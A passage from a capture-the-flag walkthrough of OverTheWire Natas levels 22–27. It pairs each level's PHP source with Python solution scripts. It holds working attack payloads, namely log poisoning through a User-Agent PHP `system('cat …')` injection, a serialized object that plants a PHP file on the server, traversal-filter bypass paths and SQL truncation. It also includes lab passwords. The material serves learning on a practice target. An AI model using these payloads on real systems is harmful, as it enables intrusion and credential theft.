# content = response.text
# print(content)

response = session.post(experimenter_url, data={
                        "submit": "", "admin": "1"}, auth=(username, password))
content = response.text
session_id = session.cookies["PHPSESSID"]

response = session.post(
    url, cookies={"PHPSESSID": session_id}, auth=(username, password))
content = response.text
print(content)
```

# Level 22

In this webpage, there is nothing except for the source code link.

Upon clicking on the view source code, there is a php code within:

```
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

.
.

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

It seems that for this challenge, the webpage will reveal the password if it sees the GET parameter `revelio`. However, if you were to do `url?revelio`, the webpage will redirect you back to the index page `/`. However, we can disable the redirect using the following python script.

```
import requests

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?revelio".format(username)

response = session.get(url, auth=(username, password), allow_redirects=False)
content = response.text
print(content)
```

# Level 23

In this webpage, we have to provide a password to login.

Upon clicking on the view source code, there is a php code within:

```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

It seems that we need to supply a password that has `iloveyou` string in it and at the same time be a integer greater than 10. How do we do that? Interestingly, PHP does not require explicit type definition in the variable declaration. Therefore `11iloveyou` will be interpreted as an integer with a `iloveyou` string in it.

# Level 24

This challenge is similar to Level 23 - we have to provide a password to login.

Upon clicking on the view source code, there is a php code within:

```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

At first glance, I didn't know what to do. So I searched for `php strcmp vulnerabilities` and found this [page](https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/). So apparently, if we pass in an array instead of a string to strcmp(), it will give a warning but the compare result returns a 0 (meaning that it's equal). Here's the python script to solve this challenge.

```
import requests

username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

response = session.post(
    url, data={"passwd[]": "anything"}, auth=(username, password))
content = response.text
print(content)
```

# Level 25

In this webpage, there is a quote printed on the screen with a dropdown to change the language of the quote.

Upon clicking on the view source code, there is a php code within:

```
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

Upon reading the source code, we can see that the `safeinclude()` method is used to prevent any directory traversals and prevent any unauthorized access to the `natas_webpass` directory.

Firstly, let's try to bypass the directory traversal part. Is there a way that we can bypass the `strstr($filename,"../"strstr()`? Perhaps we could try using `..././`? This works because the function will check for the `../` from `..././` and return us `../`!

Now that we have access to the directories in the server, we still do not have access to the `natas_webpass` directory. So what should we do here? Let's view the logs.

```
[08.08.2021 00::22:23] python-requests/2.25.1 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
```

Upon viewing the logs, we notice that there is a `user-agent` field that is logged using this line of code `$_SERVER['HTTP_USER_AGENT']`. Perhaps, we can alter that to execute a php script?

```
import requests

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

response = session.get(url, auth=(username, password))

# Trying to bypass the directory traversal
# response = session.post(
#     url, data={"lang": "..././..././..././..././..././etc/passwd"}, auth=(username, password))

# Viewing the logs
# session_id = session.cookies["PHPSESSID"]
# response = session.post(
#     url, data={"lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(session_id)}, auth=(username, password))

# Altering the User-Agent
session_id = session.cookies["PHPSESSID"]
header = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
response = session.post(
    url, data={"lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(session_id)}, auth=(username, password), headers=header)

content = response.text
print(content)
```

# Level 26

In this webpage, there is 4 inputs `X1 Y1 X2 Y2` which defines the coordinates of a line for the user to draw.

Upon clicking on the view source code, there is a php code within:

```
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

.
.

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

It seems like the webpage stores the data as a base64 encoded serialized object in their cookies. Let's check this out.

```
From Python Script:
<RequestsCookieJar[<Cookie PHPSESSID=qnccomlljs3uq8ee6gborq3tg4 for natas26.natas.labs.overthewire.org/>, <Cookie drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiI0MDAiO3M6MjoieTIiO3M6MzoiNDAwIjt9fQ%3D%3D for natas26.natas.labs.overthewire.org/>]>

Then we take the cookie data to decode it in php
<?php

$drawing = unserialize(base64_decode("YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiI0MDAiO3M6MjoieTIiO3M6MzoiNDAwIjt9fQ%3D%3D"));
print_r($drawing);

?>

Output:
Array
(
    [0] => Array
        (
            [x1] => 0
            [y1] => 0
            [x2] => 400
            [y2] => 400
        )

)
```

Looks like our assumption was correct.

Now, recall that the source code had a Logger function. Is it possible for us to adjust the Logger function to view the password file on the server?

```
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>"; # To be executed once the webpage is loaded
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>"; # To be executed once the webpage is loaded
        $this->logFile = "img/hacked.php"; # Store our log file here
    }
}

$log = new Logger();
echo(base64_encode(serialize($log)));
?>

Output:
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2hhY2tlZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=
```

Now that we modified the Logger class to do what we want, let's take the serialized Logger object and update it to the drawing cookie!

```
session.cookies["drawing"] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2hhY2tlZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="
# Try to get the response again after submitting malicious code
response = session.get(drawing_url, auth=(username, password))
content = response.text
# Check the cookies
print(session.cookies)
# print(content)

# Navigate to where the log file is stored at
password_url = url + "img/hacked.php"
response = session.get(password_url, auth=(username, password))
content = response.text
print(content)
```

# Level 27

In this webpage, we have to input a username and password.
Upon clicking on the view source code, there is a php code within:

```
<?

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysql_real_escape_string($usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysql_real_escape_string($usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
?>
```

After analyzing the source code, we can infer that the function will create the user in the database if the user does not exist or grab the data from the database if the username and password matches. However, what is interesting is in the function `dumpData()` - where the code grabs all the rows matching the username. Is there a way that we can create another user `natas28` that is not the one currently in the database? As we know that the username has a maximum characters of 64 characters, can we overflow the username to create another user `natas28`?

```
response = session.post(url, data={
                        "username": "natas28" + " " * 64 + "2", "password": "password"}, auth=(username, password))
content = response.text

Output:
User natas28                                                                2 was created!
```

It seems like we can create another `natas28` with the characters overflowed. Let's try creating another `natas28` to confirm that our assumption is correct.

```
response = session.post(url, data={
                        "username": "natas28" + " " * 64 + "2", "password": "password2"}, auth=(username, password))
content = response.text
print(content)

Output:
User natas28                                                                2 was created!
```

Awesome! We created another user `natas28` with the exact same username that we used previously. Now, we should be able to grab the password for the actual `natas28` from the database by supplying the password we used to create a dummy `natas28`.

```
response = session.post(url, data={
                        "username": "natas28", "password": "password"}, auth=(username, password))
content = response.text
print(content)
```
